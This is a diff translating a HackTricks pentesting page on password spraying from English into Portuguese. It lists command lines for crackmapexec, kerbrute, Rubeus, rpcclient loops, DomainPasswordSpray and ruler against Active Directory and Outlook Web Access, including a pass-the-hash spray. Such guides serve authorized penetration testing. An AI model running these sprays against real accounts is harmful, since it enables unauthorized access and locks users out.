@@ -1,30 +1,15 @@
-# Password Spraying
+## **Password Spraying (Ataque de Senhas)**
 
-<details>
+Depois de encontrar vários **nomes de usuário válidos**, você pode tentar as senhas mais **comuns** (lembre-se da política de senhas do ambiente) com cada um dos usuários descobertos.\
+Por **padrão**, o **comprimento mínimo** da **senha** é **7**.
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+Listas de nomes de usuário comuns também podem ser úteis: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+Observe que você **pode bloquear algumas contas se tentar várias senhas incorretas** (por padrão, mais de 10).
 
-</details>
+### Obter política de senha
 
-## **Password Spraying**
-
-Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
-By **default** the **minimum** **password** **length** is **7**.
-
-Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
-
-Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).
-
-### Get password policy
-
-If you have some user credentials or a shell as a domain user you can **get the password policy with**:
-
+Se você tiver algumas credenciais de usuário ou um shell como um usuário de domínio, você pode **obter a política de senha com**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -41,57 +26,45 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
+### Exploração a partir do Linux (ou qualquer outro)
 
-### Exploitation from Linux (or all)
-
-* Using **crackmapexec:**
-
+* Usando **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-
-* Using [**kerbrute**](https://github.com/ropnop/kerbrute) **** (Go)
-
+* Usando [**kerbrute**](https://github.com/ropnop/kerbrute) **** (Go)
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-
-* [_**spray**_](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_
-
+* [_**spray**_](https://github.com/Greenwolf/Spray) _**(você pode indicar o número de tentativas para evitar bloqueios):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-
-* Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK
-
+* Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NÃO RECOMENDADO, ÀS VEZES NÃO FUNCIONA
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-
-* With the `scanner/smb/smb_login` module of **Metasploit**:
+* Com o módulo `scanner/smb/smb_login` do **Metasploit**:
 
 ![](<../../.gitbook/assets/image (132) (1).png>)
 
-* Using **rpcclient**:
-
+* Usando **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do 
     rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
+#### A partir do Windows
 
-#### From Windows
-
-* With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
-
+* Com o [Rubeus](https://github.com/Zer1t0/Rubeus) versão com módulo de brute force:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -99,31 +72,25 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-
-* With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (It can generate users from the domain by default and it will get the password policy from the domain and limit tries according to it):
-
+* Com o [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Ele pode gerar usuários do domínio por padrão e obter a política de senha do domínio e limitar as tentativas de acordo com ela):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-
-* With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)****
-
+* Com o [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)****
 ```
 Invoke-SprayEmptyPassword
 ```
-
 ## Outlook Web Access
 
-There are multiples tools for p**assword spraying outlook**.
+Existem várias ferramentas para fazer p**assword spraying no Outlook**.
 
-* With [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
-* with [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
-* With [Ruler](https://github.com/sensepost/ruler) (reliable!)
-* With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-* With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+* Com [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
+* Com [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
+* Com [Ruler](https://github.com/sensepost/ruler) (confiável!)
+* Com [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+* Com [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-To use any of these tools, you need a user list and a password / a small list of passwords to spray.
-
+Para usar qualquer uma dessas ferramentas, você precisa de uma lista de usuários e uma senha / uma pequena lista de senhas para fazer o spraying.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
     [x] Failed: larsson:Summer2020
@@ -132,7 +99,6 @@ To use any of these tools, you need a user list and a password / a small list of
     [x] Failed: c.cube:Summer2020
     [+] Success: s.svensson:Summer2020
 ```
-
 ## Google
 
 * [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
@@ -143,7 +109,7 @@ To use any of these tools, you need a user list and a password / a small list of
 * [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 * [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## References
+## Referências
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 * [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
@@ -154,10 +120,10 @@ To use any of these tools, you need a user list and a password / a small list of
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
